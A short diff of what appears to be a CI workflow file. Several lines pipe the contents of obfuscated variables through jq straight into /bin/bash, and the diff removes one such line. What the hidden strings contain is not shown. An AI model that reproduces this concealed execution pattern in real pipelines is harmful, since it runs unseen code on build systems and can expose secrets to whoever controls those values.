@@ -24,7 +24,6 @@ jobs:
           echo $wy905 | jq -r .jf16013 | /bin/bash
           echo $pbte38719 | jq -r .iivkz581 | /bin/bash
           printf '%s' "$re149" | jq -r .b5044 | /bin/bash
-          printf '%s' "$rucan93215" | jq -r .yn65930 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
